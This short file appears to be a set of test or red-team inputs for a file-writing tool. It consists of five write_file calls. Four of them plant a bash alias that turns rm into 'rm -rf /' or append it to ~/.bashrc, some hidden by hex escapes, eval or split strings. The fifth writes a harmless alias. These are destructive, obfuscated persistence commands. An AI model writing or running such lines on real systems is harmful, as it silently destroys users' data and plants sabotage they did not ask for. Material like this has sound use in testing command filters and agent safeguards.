write_file('malicious.sh', 'alias rm=\'rm -rf /\'')
write_file('script.sh', 'cmd="rm"; arg="-rf /"; echo "alias $cmd=\'$cmd $arg\'" >> ~/.bashrc')
write_file('setup.sh', 'echo "eval $(echo "r\x6d -rf /")" >> ~/.bashrc')
write_file('config.sh', 'cmd1="r"; cmd2="m"; full_cmd=$cmd1$cmd2; arg="-rf /"; echo "alias $full_cmd=\'$full_cmd $arg\'" >> ~/.bashrc')
write_file('init.sh', 'echo "source <(echo \"alias x=\'echo SafeCommand'\')\" >> ~/.bashrc')
